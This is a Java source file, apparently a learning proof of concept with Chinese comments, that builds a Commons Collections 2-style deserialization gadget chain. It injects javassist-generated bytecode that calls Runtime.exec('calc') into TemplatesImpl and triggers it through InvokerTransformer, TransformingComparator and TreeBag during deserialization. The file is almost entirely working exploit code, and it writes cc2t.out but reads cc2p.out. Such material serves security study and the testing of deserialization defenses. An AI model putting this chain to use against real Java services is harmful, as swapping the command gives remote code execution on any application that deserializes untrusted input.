import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

public class CommonsCollections2T {
    public static void main(String[] args) throws Exception {
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
        CtClass payload=classPool.makeClass("CommonsCollections22222222222");//创建一个新的public类
        payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");"); //创建一个空的类初始化，设置构造函数主体为runtime

        byte[] bytes=payload.toBytecode();//转换为byte数组

        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl
        Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段
        field.setAccessible(true);//暴力反射
        field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组

        Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段
        field1.setAccessible(true);//暴力反射
        field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test

        InvokerTransformer transformer=new InvokerTransformer("toString",new Class[]{},new Object[]{});
        TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象

        TreeBag tb = new TreeBag(comparator);
        tb.add(templatesImpl);

        Field field2 = InvokerTransformer.class.getDeclaredField("iMethodName");
        field2.setAccessible(true);
        field2.set(transformer, "newTransformer");

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc2t.out"));
        outputStream.writeObject(tb);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("cc2p.out"));
        inputStream.readObject();
    }
}
